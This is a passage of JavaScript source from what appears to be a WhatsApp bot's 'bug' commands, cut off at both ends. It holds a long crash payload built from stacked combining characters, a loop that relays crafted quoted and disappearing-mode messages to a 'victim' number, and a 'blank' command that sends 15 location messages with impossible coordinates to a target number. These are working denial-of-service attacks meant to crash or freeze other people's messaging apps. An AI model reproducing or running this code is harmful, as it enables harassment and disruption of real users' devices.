̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺͜͜ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅ`
      commet: xiphone,
      jpegThumbnail: null
    }
  }, { quoted: xbug })
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xiphone        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await sleep(5000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
case "blank":{
if (!text) return xreply(`${prefix + command} 62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 15
for (let i = 0; i < amount; i++){
  await xartva.sendMessage(victim, {
    location: {
      degreesLatitude: 999.999,
      degreesLongitude: -99.888,
      name: xtext,
